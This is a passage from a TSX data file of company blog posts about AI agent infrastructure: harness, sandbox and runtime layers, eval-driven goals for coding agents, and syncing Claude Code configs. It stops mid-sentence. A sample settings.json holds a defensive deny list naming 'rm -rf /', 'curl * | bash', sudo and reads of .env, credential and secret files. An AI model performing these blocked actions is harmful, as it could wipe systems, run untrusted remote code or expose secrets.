import type { ReactNode } from "react";

export interface ArticleSection {
  id: string;
  heading: string;
  content: ReactNode;
}

export interface Article {
  slug: string;
  title: string;
  subtitle: string;
  date: string;
  isoDate: string;
  category: string;
  categorySlug: string;
  author: string;
  readingTime: string;
  gradient: string;
  seoTitle?: string;
  seoDescription?: string;
  keywords?: string[];
  sections: ArticleSection[];
}

export const CATEGORIES = [
  { label: "All", slug: "all" },
  { label: "Product", slug: "product" },
  { label: "Engineering", slug: "engineering" },
  { label: "Company", slug: "company" },
  { label: "Security", slug: "security" },
] as const;

export const articles: Article[] = [
  {
    slug: "harness-runtime-sandbox-field-guide",
    title: "Harness, Runtime, Sandbox: A Field Guide to Agent Infrastructure",
    subtitle:
      "Three words the ecosystem uses interchangeably — and the three different questions they actually answer.",
    date: "June 23, 2026",
    isoDate: "2026-06-23",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "8 min read",
    gradient: "linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #6366f1 100%)",
    seoTitle: "Harness vs Runtime vs Sandbox: Agent Infrastructure Explained",
    seoDescription:
      "Harness, runtime, and sandbox are three different layers of agent infrastructure — not synonyms. A field guide to what each layer does and how to evaluate them.",
    keywords: [
      "agent infrastructure",
      "agent harness",
      "agent runtime",
      "agent sandbox",
      "harness vs runtime vs sandbox",
      "AI agent infrastructure layers",
    ],
    sections: [
      {
        id: "three-questions",
        heading: "Three words, three questions",
        content: (
          <>
            <p>
              <strong>Harness</strong>, <strong>runtime</strong>, and{" "}
              <strong>sandbox</strong> are three different layers of agent
              infrastructure — not three words for the same thing. But the ecosystem
              treats them as synonyms: vendors blur them, threads argue past each
              other, and teams end up comparing a code-execution box to a deployment
              platform as if they were competitors.
            </p>
            <p>They're not. They're three layers that answer three different questions:</p>
            <ul>
              <li>
                <strong>Harness</strong> — <em>How does an agent work a task?</em>
              </li>
              <li>
                <strong>Sandbox</strong> — <em>Where do its actions run safely?</em>
              </li>
              <li>
                <strong>Runtime</strong> —{" "}
                <em>How do agents live and stay governed in production?</em>
              </li>
            </ul>
            <p>
              This is our framing, not a standards body's taxonomy — three layers
              we've found load-bearing while running agents in production, not an
              official decomposition. With that caveat stated: most teams running
              agents in production end up needing all three. They compose; they don't
              compete. Here's a field guide to telling them apart — and why the
              distinction changes what you should evaluate.
            </p>
          </>
        ),
      },
      {
        id: "harness",
        heading: "Harness — the driver loop",
        content: (
          <>
            <p>
              Picture the harness as the part most people mean when they say "AI
              agent." It's the loop that turns a model plus a set of tools into
              something that <em>does work</em>: read a file, edit it, run a command,
              look at the result, decide the next step. It owns the prompt, the
              tool-calling protocol, the plan→act→observe cycle, and the surface a
              human (or a trigger) uses to start the work. It's also where a lot of the
              measured quality lives: on SWE-bench Verified, the same underlying model
              posts very different scores depending on the harness wrapped around it —
              the scaffold moves the result, not just the model.
            </p>
            <p>
              <strong>Scope:</strong> a session. A harness is alive while a task is
              being worked.
            </p>
            <p>
              <strong>To spot a harness, look for</strong> a product about{" "}
              <em>driving a model through a task</em> — the interactive coding surface,
              the agent loop, the tool schema.
            </p>
            <p>
              <strong>Examples across the ecosystem:</strong> Claude Code, Cursor,
              Aider, OpenHands, Cline, Continue, opencode, Devin. (GAL's own harness,{" "}
              <em>gal-code</em>, is built on opencode.) These differ in UX and model
              strategy, but they're answering the same question:{" "}
              <em>how does one agent get a task done, right now?</em>
            </p>
            <p>
              <strong>
                What a harness is <em>not</em>:
              </strong>{" "}
              it's not where the <code>rm -rf</code> actually executes, and it's not
              what keeps a fleet of agents running and accountable next week. A great
              harness with no sandbox is a security incident waiting to happen; a great
              harness with no runtime is a laptop process you have to babysit.
            </p>
          </>
        ),
      },
      {
        id: "sandbox",
        heading: "Sandbox — the isolation boundary",
        content: (
          <>
            <p>
              The sandbox is <em>where the agent's actions actually run</em>, walled
              off from your host, your network, and your other tenants. When an agent
              executes generated code, installs a package, or runs a shell command, the
              sandbox is what makes that safe and reproducible: a fresh, disposable,
              resource-limited environment with a controlled blast radius.
            </p>
            <p>
              <strong>Scope:</strong> an execution. A sandbox exists to contain{" "}
              <em>what the agent does</em>, not to drive it.
            </p>
            <p>
              <strong>To spot a sandbox, look for</strong> a product about{" "}
              <em>isolation and safe execution</em> — container or microVM boundaries,
              filesystem/network egress controls, snapshot/restore, per-run teardown.
            </p>
            <p>
              <strong>Examples across the ecosystem:</strong> e2b, Modal, and Daytona
              for managed code-execution sandboxes; Kata Containers, gVisor, and
              Firecracker microVMs for the isolation primitives underneath. The
              performance bar here is real and measured: AWS's Firecracker — the microVM
              monitor behind Lambda — boots a fresh VM in roughly 125 ms and can pack on
              the order of 150 microVMs per second onto a single host (Agache et al.,{" "}
              <em>NSDI 2020</em>), fast enough to give every agent run its own
              disposable kernel rather than a shared container. (GAL builds its own,{" "}
              <em>gal-sandbox</em>, on that same Kata/microVM lineage.)
            </p>
            <p>
              <strong>
                What a sandbox is <em>not</em>:
              </strong>{" "}
              it doesn't decide <em>what</em> the agent should do (that's the harness),
              and it doesn't manage agents as long-lived, governed services (that's the
              runtime). A sandbox is a very good box. It is not an operating model.
            </p>
          </>
        ),
      },
      {
        id: "runtime",
        heading: "Runtime — the operational substrate",
        content: (
          <>
            <p>
              This is the layer with the least-standardized name, and the one most
              often conflated with "the framework" or "wherever I deployed it." A
              runtime is the substrate where agents <strong>live</strong> as
              long-running, deployed services — not a session you drive by hand, but a
              place agents are scheduled, triggered, observed, coordinated, and{" "}
              <strong>governed</strong>.
            </p>
            <p>
              A useful test: hosting a harness on a server does not make a runtime.
              Interrogate a would-be runtime on six things — and reach for one the
              moment you need any of them:
            </p>
            <ul>
              <li>
                <strong>Lifecycle</strong> — agents that are triggered (events,
                schedules, A2A calls), run to completion, report, and resume; not a
                process you restart manually.
              </li>
              <li>
                <strong>Durable state</strong> — checkpointing and memory that survive a
                run, a crash, or a redeploy.
              </li>
              <li>
                <strong>Observability</strong> — traces, metrics, and an audit trail
                across every run, not just one session's logs.
              </li>
              <li>
                <strong>Coordination</strong> — agents that hand work to other agents
                (agent-to-agent protocols), with a control plane that knows what's
                running.
              </li>
              <li>
                <strong>Governance</strong> — enforced policy on{" "}
                <em>what an agent is allowed to do</em>: read-only vs. draft-for-review
                vs. pause-for-human-approval, applied as middleware rather than left to
                the prompt.
              </li>
              <li>
                <strong>Deployment control</strong> — eval-gating and rollout policy, so
                a regression can't ship silently.
              </li>
            </ul>
            <p>
              <strong>Scope:</strong> a deployment. A runtime is alive across many
              sessions, many agents, and long stretches of calendar time.
            </p>
            <p>
              <strong>Examples across the ecosystem:</strong> this is where the map is
              genuinely sparser and the terms are fuzzier. LangGraph Platform, Temporal
              and Inngest (durable-execution engines being bent toward agents), AWS
              Bedrock AgentCore, and the various "agents" runtimes from the big labs all
              live in this neighborhood — though they emphasize different facets
              (durability, orchestration, hosting). The <strong>governance</strong>{" "}
              dimension specifically — every action running under an enforced posture,
              with the approval decision itself captured as an auditable artifact — is
              the newest and least common piece. (GAL's runtime, <em>gal-cloud</em>, is
              built on deepagents/LangGraph and leans hardest on that governance facet;
              it's one point in a small but growing space, not the only one.)
            </p>
            <p>
              <strong>
                What a runtime is <em>not</em>:
              </strong>{" "}
              it's not the agent's task loop (that's the harness), and it's not the
              execution jail (that's the sandbox). The runtime is what turns "I have an
              agent that works" into "I have agents running in production that I can
              trust, observe, and answer for."
            </p>
          </>
        ),
      },
      {
        id: "compose",
        heading: "How they compose",
        content: (
          <>
            <p>Follow a single request through all three layers:</p>
            <pre>
              <code>{` trigger ─▶ ┌──────────────── RUNTIME ─────────────────┐
            │  claim task · load state · set posture    │
            │   ┌──────────── HARNESS ─────────────┐    │
            │   │       plan → act → observe        │    │
            │   │   ┌────────── SANDBOX ──────────┐ │    │
            │   │   │   run code / shell safely    │ │    │
            │   │   └──────────────────────────────┘ │    │
            │   └───────────────────────────────────┘    │
            │  trace · approval gate · checkpoint · report │
            └───────────────────────────────────────────┘`}</code>
            </pre>
            <ol>
              <li>
                A trigger hits the <strong>runtime</strong> — an event, a schedule, or
                another agent's call. The runtime claims the task, loads state, and
                starts an agent under a governance posture.
              </li>
              <li>
                The agent runs its <strong>harness</strong> loop — plan, call a tool,
                observe, repeat — driven by the model.
              </li>
              <li>
                When a step executes code or a shell command, that runs inside the{" "}
                <strong>sandbox</strong> — isolated, disposable, blast-radius-controlled.
              </li>
              <li>
                The runtime records the trace, enforces the approval gate on anything
                mutating, checkpoints state, and reports the outcome.
              </li>
            </ol>
            <p>
              Governance is the layer most easily hand-waved, so here is what it looks
              like concretely rather than in prose. The posture model below is one
              pattern teams are converging on — others use approval-chain trees or
              capability matrices — but the shape is the same: a policy declares what an
              agent may do without a human in the loop, and what it must stop for:
            </p>
            <pre>
              <code>{`agent: migration-bot
posture: draft-for-review        # read-only | draft-for-review | autonomous
allow: [read, write_branch]
require_approval: [merge_main, deploy, delete_data]`}</code>
            </pre>
            <p>
              and every gated action lands in an audit trail as a record you can answer
              for later:
            </p>
            <pre>
              <code>{`{"ts":"2026-06-23T14:02:11Z","agent":"migration-bot","action":"merge_main","layer":"runtime","decision":"approved","approver":"shay"}`}</code>
            </pre>
            <p>
              Flip <code>posture</code> to <code>read-only</code> and the same agent can
              no longer open a branch; flip it to <code>autonomous</code> and the{" "}
              <code>require_approval</code> list empties, so those actions stop surfacing
              in the approval queue at all. One field, three operating postures — that is
              what "governance you can enforce" means in practice.
            </p>
            <p>
              Harness, sandbox, runtime — the loop, the box, and the operating model. A
              tool that's strong in one layer is often marketed as if it covered all
              three; that conflation is where most "agent platform" confusion comes from.
            </p>
          </>
        ),
      },
      {
        id: "why-it-matters",
        heading: "Why the distinction matters when you buy",
        content: (
          <>
            <p>
              Because each layer owns a different problem, each is judged on a different
              axis — which is exactly why you can't compare them head-to-head. The{" "}
              <strong>harness is the cockpit</strong>, the{" "}
              <strong>sandbox is the test cell</strong>, and the{" "}
              <strong>runtime is the airline</strong> — the operations, scheduling, and
              accountability that let a fleet fly every day. When you evaluate a tool,
              ask which one it actually is:
            </p>
            <ul>
              <li>
                A <strong>harness</strong> should win on agent quality: task success
                rate, tool ergonomics, model flexibility.
              </li>
              <li>
                A <strong>sandbox</strong> should win on isolation: startup latency,
                escape resistance, resource limits, teardown.
              </li>
              <li>
                A <strong>runtime</strong> should win on operations: durability,
                observability, multi-agent coordination, and{" "}
                <strong>governance you can enforce and audit</strong> — not just "we host
                it."
              </li>
            </ul>
            <p>
              Each layer earns its strength by owning exactly one problem — task success,
              isolation, or accountability — <em>completely</em>; a tool that claims all
              three at once usually does none of them well.{" "}
              <strong>Three layers, three problems, three axes of evaluation:</strong>{" "}
              the harness owns agent quality, the sandbox owns blast radius, the runtime
              owns operations. Plenty of companies sell cockpits and test cells. The
              airline — the least-standardized of the three — is the harder problem, and
              the one most teams discover last.
            </p>
            <p>
              Conflate the layers and the failures are predictable — one per layer you
              skipped. Skip the <strong>sandbox</strong> and the agent's generated code
              runs <code>rm -rf</code> against the wrong path and takes the host
              filesystem with it, or — with no egress control — quietly ships the
              credentials in its environment to a third party. Skip the{" "}
              <strong>runtime</strong> and the agent crashes mid-task with no durable
              checkpoint, so a restart loses all progress: ten reruns instead of one
              resume from step five. Skip <em>governance</em> specifically — wire a
              harness straight to production — and when an agent loops on a bad tool
              call, there's no trace to reconstruct what it touched and no gate that
              could have stopped it. The fixes live in the layers you skipped:
              escape-audit your sandbox, put SLOs and an audit trail on your runtime, and
              keep an approval gate in front of anything that mutates state.
            </p>
            <p>
              Two honest boundaries. First, this three-layer split is <em>one</em> useful
              decomposition, not the only one — a capability / constraint / accountability
              cut works too, and specialized setups won't always map cleanly. Second, you
              can sometimes skip a layer: a read-only research agent on a curated dataset
              may not need the full governance layer if data-access control already draws
              the boundary — but the moment it takes user requests, you need all three.
            </p>
            <p>
              Separate them deliberately and you stop comparing the cockpit to the
              airline — they're not competitors, they're sequential — and you know
              exactly which question each piece answers.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "claude-code-goal-eval-driven-development",
    title: "Defining \"done\" for a coding agent",
    subtitle:
      "We run a lot of our engineering through AI agents, and they will report a task finished before it has been verified. This is how we caught that on one migration — by making the goal a check the work had to pass.",
    date: "June 22, 2026",
    isoDate: "2026-06-22",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "7 min read",
    gradient: "linear-gradient(135deg, #0f172a 0%, #064e3b 50%, #10b981 100%)",
    seoTitle: "Eval-driven development with Claude Code's /goal",
    seoDescription:
      "We turned Claude Code's /goal into eval-driven development — a goal is its eval suite (metric, threshold, how-to-run, live score). Blind benchmark: goal quality 46%→92%.",
    keywords: [
      "Claude Code /goal",
      "Claude Code goal command",
      "eval-driven development",
      "goal-driven development",
      "Claude Code skills",
      "eval-driven development Claude Code",
    ],
    sections: [
      {
        id: "the-problem",
        heading: "The problem",
        content: (
          <>
            <p>
              We run a lot of our engineering through AI coding agents. The expensive
              failure mode is specific: an agent reports a task finished before it has
              verified it, and nothing catches the gap until later.
            </p>
            <p>
              We hit this on a migration this month, and fixed it with a small change to
              how we set the goal. What follows is that account, including where it's
              still unfinished.
            </p>
          </>
        ),
      },
      {
        id: "the-migration",
        heading: "The migration",
        content: (
          <>
            <p>
              We're consolidating our open-source scheduling app from a Flutter codebase
              into native iOS and Android. A screen can compile, open, and look right on
              one platform while silently missing on the other, or while dropping a
              capability the Flutter version had.
            </p>
            <p>
              A few days in, the session's reports and the actual state had drifted.
              Password reset is a representative case: the Android unit tests passed and a
              draft PR was open, but the end-to-end test had never run and the iOS side
              was untouched — the session counted it as progress; the eval counted one of
              four required checks, on one platform. My Schedules looked right on Android
              and returned an empty list on iOS, where the data call lost a render race
              under load. In each case the agent was reporting what it had written, not
              what it had run.
            </p>
          </>
        ),
      },
      {
        id: "defining-done",
        heading: "Defining done as a script that returns a verdict",
        content: (
          <>
            <p>
              We replaced the prose goal with a script that returns a pass/fail verdict.
            </p>
            <p>
              <code>eval/consolidation/run.sh</code> scores the migration. For each of 27
              in-scope feature areas it requires four things to pass — a unit test and a
              Maestro end-to-end flow, on both iOS and Android — and counts an area as done
              only when all four are green. It prints a scorecard and exits non-zero until
              every area passes:
            </p>
            <pre>
              <code>{`E1 parity (BOTH natives full): 10/27   ← the done bar
RESULT: ❌ FAIL — 17 areas not yet parity on both platforms`}</code>
            </pre>
            <p>
              Then we set that script as the session's completion condition, with Claude
              Code's{" "}
              <a
                href="https://code.claude.com/docs/en/goal"
                target="_blank"
                rel="noopener noreferrer"
                className="underline"
              >
                /goal
              </a>
              :
            </p>
            <blockquote className="border-l-2 border-gray-300 pl-4 italic text-black/70">
              Consolidation is DONE only when <code>bash eval/consolidation/run.sh</code>{" "}
              prints "RESULT: ✅ PASS" — E1 parity 27/27 on both platforms … Baseline
              measured 2026-06-21: 1/27. Method: go page-by-page, re-running{" "}
              <code>run.sh</code> after each. ASK before anything irreversible — merge to
              main, a production deploy, a security-rules change, anything touching a
              paying customer. Keep working until <code>run.sh</code> reports PASS or
              you're stopped.
            </blockquote>
            <p>
              Per Anthropic's docs, <code>/goal</code> hands that condition to a separate,
              smaller model that checks it from the transcript after each turn; it won't
              let the session report itself done until the condition holds. Two parts of
              the condition matter beyond the count. The baseline was a measured number —
              1 of 27 — so progress had something real to move against. And the method
              named the gates: the irreversible steps the agent has to hand back to a
              human. The eval defines what done means; the gates define which steps a
              human still signs off.
            </p>
          </>
        ),
      },
      {
        id: "what-it-caught",
        heading: "What the scorecard caught",
        content: (
          <>
            <p>
              Over two days the parity score went from 1 to 11 of 27. It didn't climb in a
              straight line. One run reported 0 — a clean-machine run before the build was
              staged. It slid from 11 to 8 to 10 as end-to-end flows flaked under memory
              pressure on the test host and as areas that had been green stopped passing.
            </p>
            <img
              src="/blog/consolidation-parity-climb.svg"
              alt="Consolidation parity from a baseline of 1 to a peak of 11 of 27 over two days, with dips along the way"
              className="w-full rounded-sm border border-gray-100 my-2"
            />
            <p>
              A prose goal gives no signal when an area regresses; a scored one shows the
              drop, because the number is recomputed from the script on each run. The
              migration isn't finished. As of this writing it's at 10 of 27. We're
              publishing the method, not a completed migration.
            </p>
          </>
        ),
      },
      {
        id: "generalizes",
        heading: "Whether the method generalizes",
        content: (
          <>
            <p>
              Setting a goal as an eval is a procedure, so we wrote it down as a reusable
              skill and tested it the way we test code. Three goal-setting prompts, each a
              known way to fail: a "do what's best" request, a North Star that's secretly a
              one-time launch, and a goal stated as "make it secure and the docs better."
              Three configurations — no skill, an earlier version, the current one — three
              runs per cell, graded against eight fixed checks by a separate grader, with
              project memory emptied so no run could inherit an earlier goal.
            </p>
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b-2 border-gray-200">
                  <th className="py-3 pr-4 font-semibold">Configuration</th>
                  <th className="py-3 pr-4 font-semibold">
                    Checks passed (mean of 8, n=9)
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr className="border-b border-gray-100">
                  <td className="py-3 pr-4 font-medium">No skill</td>
                  <td className="py-3 pr-4">46%</td>
                </tr>
                <tr className="border-b border-gray-100">
                  <td className="py-3 pr-4 font-medium">Earlier version</td>
                  <td className="py-3 pr-4">61%</td>
                </tr>
                <tr className="border-b border-gray-100">
                  <td className="py-3 pr-4 font-medium">Current skill</td>
                  <td className="py-3 pr-4">92%</td>
                </tr>
              </tbody>
            </table>
            <img
              src="/blog/benchmark-by-scenario.svg"
              alt="Goal quality by scenario, no skill vs current skill: decisive 79 vs 96, altitude 33 vs 92, measurability 25 vs 88 percent"
              className="w-full rounded-sm border border-gray-100 my-2"
            />
            <p>
              The gain isn't uniform. On a straightforward request an unaided model already
              does most of the work (79% to 96%). On the prompts we tested where a
              plausible-looking goal isn't a checkable one, the gap is larger: a North Star
              stated as the launch that ends it (33% to 92%), or "secure" and "better docs"
              left as the definition of done (25% to 88%). The spread matters too. Without
              the skill the same prompt produced anything from a 12% to an 87% goal; with
              it, every run scored between 88% and 100%. A goal is set once and steered by
              for weeks, so that consistency is worth as much as the mean.
            </p>
            <p>
              This measures goal quality, not whether the project ships; it's a single
              model; and an earlier single run reported 100% only because it inherited a
              good goal from memory — emptying memory brings it to 92%.
            </p>
          </>
        ),
      },
      {
        id: "prior-art",
        heading: "What we didn't invent",
        content: (
          <>
            <p>
              <code>/goal</code> is Anthropic's. Defining work as evals is an established
              practice with its own literature. Writing a goal as acceptance criteria is a
              common idea, and people already point <code>/goal</code> at a test. The piece
              we haven't seen elsewhere is narrow: forcing the North Star up to an enduring
              state before writing the checks, and scoring the whole thing as a suite with
              a live number per check rather than one pass/fail condition. If that exists
              already, we'll cite it.
            </p>
          </>
        ),
      },
      {
        id: "scaling",
        heading: "From one repo to an organization",
        content: (
          <>
            <p>
              A <code>/goal</code> string and one <code>run.sh</code> work for one session,
              one repo, one engineer watching the scorecard. They don't scale past that. We
              run agents across many repositories; the discipline that fixed the migration
              — define done as a check the work has to pass, require a human for the
              irreversible steps — has to apply across every agent and repo, not just the
              one someone happens to be watching.
            </p>
            <p>
              That is what we're building GAL into. The same two rules — each task has a
              check it must pass, and a human approves the irreversible steps — apply
              across every agent and repository, with a record of what each agent actually
              did. The skill is the single-session form of this, and it's{" "}
              <a
                href="https://github.com/gal-run/gal/tree/main/.claude/skills/set-goal"
                target="_blank"
                rel="noopener noreferrer"
                className="underline"
              >
                open source in the GAL repo
              </a>
              . The migration above is the same discipline done by hand.
            </p>
            <p>
              We applied the same check to this post. It was scored against a rubric —
              voice, unverified claims, factual accuracy against the artifacts — and
              rewritten where it failed, which is why an earlier draft's invented scorecard
              line and a few borrowed phrases aren't in the version you're reading. For your
              own goals, write the command that prints the verdict before you write the goal
              text, and treat the goal as undefined until that command runs.
            </p>
          </>
        ),
      },
    ],
  },

  {
    slug: "sync-claude-code-configs-team",
    title: "How to Sync Claude Code Configs Across Your Engineering Team",
    subtitle:
      "A practical guide to syncing CLAUDE.md, settings.json, custom commands, and agent policies across every developer in your organization.",
    date: "May 4, 2026",
    isoDate: "2026-05-04",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "12 min read",
    gradient: "linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0ea5e9 100%)",
    sections: [
      {
        id: "the-config-drift-problem",
        heading: "The Claude Code config drift problem",
        content: (
          <>
            <p>
              Your team adopted Claude Code. Developers love it. Productivity is
              up. But three months in, you notice something: every engineer has a
              completely different configuration. One developer has a meticulous{" "}
              <code>CLAUDE.md</code> with architecture context, testing norms,
              and security rules. Another has an empty one. A third never created
              one at all.
            </p>
            <p>
              Their <code>.claude/settings.json</code> files are equally
              inconsistent. Some developers have granted broad tool permissions,
              allowing their agent to run any command. Others have restricted it
              to the point where it cannot even run tests. Nobody is sharing their
              custom slash commands, and the specialized agents that your senior
              engineer built in <code>.claude/agents/</code> only exist on their
              laptop.
            </p>
            <p>
              This is configuration drift. It affects every team using Claude Code
              at scale, and it gets worse as the team grows. You start to see new
              engineers spend their first hour copying someone else's{" "}
              <code>CLAUDE.md</code> from a Slack message. Your security team asks
              "what are your AI agents allowed to do?" and nobody has a single
              answer. A contractor leaves and you realize they had critical custom
              commands that nobody else has.
            </p>
            <p>
              The good news: this is a solved problem. This guide covers three
              practical approaches to sync Claude Code configuration across your
              engineering team, from simple to enterprise-grade.
            </p>
          </>
        ),
      },
      {
        id: "what-files-to-sync",
        heading: "What files make up a Claude Code configuration",
        content: (
          <>
            <p>
              Before choosing a sync approach, understand the six key files that
              control how Claude Code behaves:
            </p>
            <p>
              <strong>CLAUDE.md — Project memory and instructions</strong>
            </p>
            <p>
              This is the primary file that shapes Claude Code's behavior. It
              lives at your project root and contains architecture context, coding
              standards, testing norms, and behavioral instructions. A good team{" "}
              <code>CLAUDE.md</code> might include:
            </p>
            <pre>
              <code>{`# Project Instructions

## Architecture
This is a Next.js 14 app with a separate Express API.
Auth is handled in packages/auth using Firebase Auth.
All database access goes through packages/core (Clean Architecture).

## Code Standards
- TypeScript strict mode. No \`any\` types.
- Prefer functional components with hooks.
- All new code must have unit tests (Vitest).

## Testing
Run \`pnpm test\` before committing. Never skip failing tests.

## Agent Behavior
- Be concise. Show code, not descriptions.
- Never hardcode secrets. Use environment variables only.
- Always run \`pnpm check\` before considering work done.`}</code>
            </pre>
            <p>
              <strong>.claude/settings.json — Permissions and tool access</strong>
            </p>
            <p>
              This file controls which tools Claude Code can use and what commands
              it is allowed to run. Sharing a consistent <code>settings.json</code>{" "}
              ensures every developer's agent has the same guardrails:
            </p>
            <pre>
              <code>{`{
  "permissions": {
    "allow": [
      "Bash(git *)",
      "Bash(pnpm *)",
      "Bash(npm *)",
      "Bash(make *)",
      "Bash(npx vitest *)"
    ],
    "deny": [
      "Bash(rm -rf /)",
      "Bash(curl * | bash)",
      "Bash(sudo *)",
      "Bash(git push --force *)",
      "Read(.env*)",
      "Read(*credentials*)",
      "Read(*secrets*)"
    ]
  }
}`}</code>
            </pre>
            <p>
              <strong>.claude/commands/ — Custom slash commands</strong>
            </p>
            <p>
              These are team-specific workflows encoded as slash commands. When
              shared, every developer gets the same <code>/review</code>,{" "}
              <code>/deploy</code>, or <code>/test</code> commands:
            </p>
            <pre>
              <code>{`# .claude/commands/review.md
Review the current diff against our coding standards.
Check for:
1. TypeScript strict compliance (no any, no ts-ignore)
2. Test coverage for new functions
3. No hardcoded secrets or API keys
4. Proper error handling
Output a summary with pass/fail for each check.`}</code>
            </pre>
            <p>
              <strong>.claude/agents/ — Specialized agent definitions</strong>
            </p>
            <p>
              Agent files define specialized personas that developers can invoke
              for specific tasks. A shared set ensures the whole team has access
              to the same expert agents.
            </p>
            <p>
              <strong>.mcp.json — MCP server configuration</strong>
            </p>
            <p>
              MCP (Model Context Protocol) servers extend Claude Code with
              external tools like Sentry, GitHub, or custom internal services. A
              shared <code>.mcp.json</code> ensures every developer has access to
              the same integrations.
            </p>
            <p>
              <strong>.claude/rules/ — Context-specific rules</strong>
            </p>
            <p>
              Rules files auto-load based on file paths. For example, a rule for
              API development only loads when editing files in <code>apps/api/</code>.
            </p>
          </>
        ),
      },
      {
        id: "approach-1-git-repo",
        heading: "Approach 1: Commit to your Git repository",
        content: (
          <>
            <p>
              The simplest way to share Claude Code configuration is to commit the
              files directly to your project repository. Every developer who clones
              the repo gets the same <code>CLAUDE.md</code>, the same{" "}
              <code>.claude/settings.json</code>, and the same custom commands.
            </p>
            <pre>
              <code>{`# Typical repo structure with shared Claude Code config
my-project/
├── CLAUDE.md                    # Shared project instructions
├── .claude/
│   ├── settings.json            # Shared tool permissions
│   ├── commands/
│   │   ├── review.md            # Team code review command
│   │   ├── test.md              # Team testing command
│   │   └── deploy-checklist.md  # Deployment checklist command
│   ├── agents/
│   │   ├── qa-engineer.md       # QA specialist agent
│   │   └── security-reviewer.md # Security review agent
│   └── rules/
│       ├── api-development.md   # Rules for API files
│       └── e2e-testing.md       # Rules for test files
├── .mcp.json                    # Shared MCP server config
└── src/
    └── ...`}</code>
            </pre>
            <p>
              Updates go through your normal pull request workflow. When someone
              improves the <code>CLAUDE.md</code> or adds a new custom command,
              they open a PR, the team reviews it, and everyone gets the update on
              their next <code>git pull</code>.
            </p>
            <p>
              <strong>Pros:</strong> Simple, version-controlled, works with your
              existing PR workflow, zero new tooling.
            </p>
            <p>
              <strong>Cons:</strong> Does not scale across many repos. No way to
              push updates to developers. Merge conflicts in <code>CLAUDE.md</code>{" "}
              when multiple people edit it. No visibility into who is actually
              using the config.
            </p>
          </>
        ),
      },
      {
        id: "approach-2-dotfiles",
        heading: "Approach 2: Dotfiles repository with symlinks",
        content: (
          <>
            <p>
              Many engineering teams already use dotfiles repositories to share
              shell configs, editor settings, and development tooling. The same
              pattern works for sharing Claude Code configuration at the user
              level.
            </p>
            <p>
              Claude Code reads configuration from two locations: the project
              directory and the user's home directory at <code>~/.claude/</code>.
              A dotfiles setup can populate the home directory with organization
              defaults while leaving project-level configs for per-repo
              customization.
            </p>
            <pre>
              <code>{`# Team dotfiles repo structure
team-dotfiles/
├── claude/
│   ├── CLAUDE.md              # Org-wide agent instructions
│   ├── settings.json          # Default tool permissions
│   ├── commands/
│   │   ├── review.md          # Standard code review
│   │   ├── commit.md          # Commit message generator
│   │   └── onboard.md         # Onboarding helper
│   └── agents/
│       ├── architect.md       # Architecture review agent
│       └── docs-writer.md     # Documentation agent
├── install.sh                 # Symlinks everything to ~/.claude/
└── README.md`}</code>
            </pre>
            <p>
              Developers clone the dotfiles repo once, run the install script, and
              get the organization's baseline. They can layer personal
              customizations on top by adding their own files to{" "}
              <code>~/.claude/</code>.
            </p>
            <p>
              <strong>Pros:</strong> Familiar pattern for teams already using
              dotfiles. Supports personal customization. Works across multiple
              projects without per-repo setup.
            </p>
            <p>
              <strong>Cons:</strong> No centralized management. Updates require
              each developer to manually pull and reinstall. No enforcement.
              No audit trail. Does not handle multi-platform configs (Cursor,
              Copilot, etc.) without significant extra scripting.
            </p>
          </>
        ),
      },
      {
        id: "approach-3-gal",
        heading: "Approach 3: GAL for centralized config sync",
        content: (
          <>
            <p>
              GAL (Governance Agentic Layer) was built specifically to solve the
              problem of sharing and syncing Claude Code configuration across
              organizations. Instead of relying on git pulls, symlinks, or install
              scripts, GAL provides a centralized dashboard where an admin sets
              the approved configuration and a CLI that distributes it to every
              developer with a single command.
            </p>
            <pre>
              <code>{`# Install the GAL CLI
npm install -g @gal-run/cli

# Authenticate with your GitHub account
gal auth login

# Pull the organization's approved Claude Code configuration
gal sync --pull

# Output:
# ✓ CLAUDE.md updated (v14 → v15)
# ✓ .claude/settings.json updated (permissions: 3 new allow rules)
# ✓ .claude/commands/ synced (2 new commands: /review, /deploy-check)
# ✓ .claude/agents/ synced (1 new agent: security-reviewer)
# ✓ .mcp.json unchanged
# Sync complete. All components on approved baseline.`}</code>
            </pre>
            <p>
              When an admin updates the approved configuration in the GAL
              dashboard, every developer gets it on their next{" "}
              <code>gal sync --pull</code>. No Slack messages, no manual copying,
              no merge conflicts.
            </p>
            <p>
              GAL also handles multi-platform configuration. The same approved
              config can be synced to Claude Code, Cursor, GitHub Copilot,
              Windsurf, Gemini Code Assist, and Codex from a single source of
              truth. You set policy once; GAL translates it to each platform's
              configuration format.
            </p>
            <p>
              For enterprise teams, GAL provides an audit trail: you can see which
              developers have synced, when they last pulled the config, and which
              version they are running. This is the answer to your security
              team's question about what your AI agents are configured to do.
            </p>
            <p>
              <strong>Pros:</strong> Centralized management from a dashboard.
              One-command sync for developers. Multi-platform support. Audit trail
              and version history. Scales to organizations of any size.
            </p>
            <p>
              <strong>Cons:</strong> Requires a GAL account (free tier available).
              Adds a tool to the workflow. Newer product compared to git-based
              approaches.
            </p>
          </>
        ),
      },
      {
        id: "comparison",
        heading: "Comparison: Which approach is right for your team?",
        content: (
          <>
            <p>
              The right approach depends on your team size, how many repositories
              you manage, and whether you have compliance requirements around AI
              agent governance.
            </p>
            <p>
              <strong>Solo developer or team of 1-5:</strong> Commit your{" "}
              <code>CLAUDE.md</code> and <code>.claude/</code> directory directly
              to your repo. This is the simplest path and works because you can
              coordinate updates over a quick standup or Slack message. Use your
              normal PR workflow to review changes.
            </p>
            <p>
              <strong>Team of 5-15, single repo or small multi-repo:</strong> Use
              a combination of git repo configs and a dotfiles repository. Put
              project-specific context in each repo's <code>CLAUDE.md</code>. Put
              org-wide settings, commands, and agents in a shared dotfiles repo.
              This gives you flexibility while keeping a baseline consistent.
            </p>
            <p>
              <strong>Team of 15+, multiple repos, or compliance requirements:</strong>{" "}
              Use GAL. The overhead of manual sync becomes unsustainable at this
              scale, and the audit trail becomes necessary if you need to
              demonstrate governance to auditors or security teams. The
              multi-platform support also becomes valuable as different developers
